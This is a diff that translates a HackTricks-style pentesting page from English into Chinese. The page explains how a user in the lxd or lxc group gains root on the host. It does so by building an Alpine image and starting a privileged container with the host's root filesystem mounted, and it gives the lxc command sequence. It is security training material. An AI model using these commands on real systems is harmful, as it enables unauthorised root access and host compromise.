@@ -1,15 +1,14 @@
-# lxd/lxc Group - Privilege escalation
+# lxd/lxc 组 - 权限提升
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root
+如果您属于 _**lxd**_ **或** _**lxc**_ **组**，您可以成为 root
 
-## Exploiting without internet
+## 无需互联网的利用
 
-### Method 1
+### 方法 1
 
-You can install in your machine this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(follow the instructions of the github):
-
+您可以在您的机器上安装这个发行版构建工具：[https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(按照 GitHub 的说明进行操作)：
 ```bash
 sudo su
 # Install requirements
@@ -34,9 +33,7 @@ sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ## Using build-lxc
 sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
 ```
-
-Upload the files **lxd.tar.xz** and **rootfs.squashfs**, add the image to the repo and create a container:
-
+上传文件 **lxd.tar.xz** 和 **rootfs.squashfs**，将镜像添加到仓库并创建一个容器：
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -51,23 +48,19 @@ lxc list
 
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
-
 > [!CAUTION]
-> If you find this error _**Error: No storage pool found. Please create a new storage pool**_\
-> Run **`lxd init`** and **repeat** the previous chunk of commands
+> 如果您发现此错误 _**错误：未找到存储池。请创建一个新的存储池**_\
+> 运行 **`lxd init`** 并 **重复** 之前的命令块
 
-Finally you can execute the container and get root:
-
+最后，您可以执行容器并获取 root：
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
+### 方法 2
 
-### Method 2
-
-Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
-
+构建一个 Alpine 镜像并使用标志 `security.privileged=true` 启动它，强制容器以 root 身份与主机文件系统交互。
 ```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
@@ -87,5 +80,4 @@ lxc init myimage mycontainer -c security.privileged=true
 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 ```
-
 {{#include ../../../banners/hacktricks-training.md}}
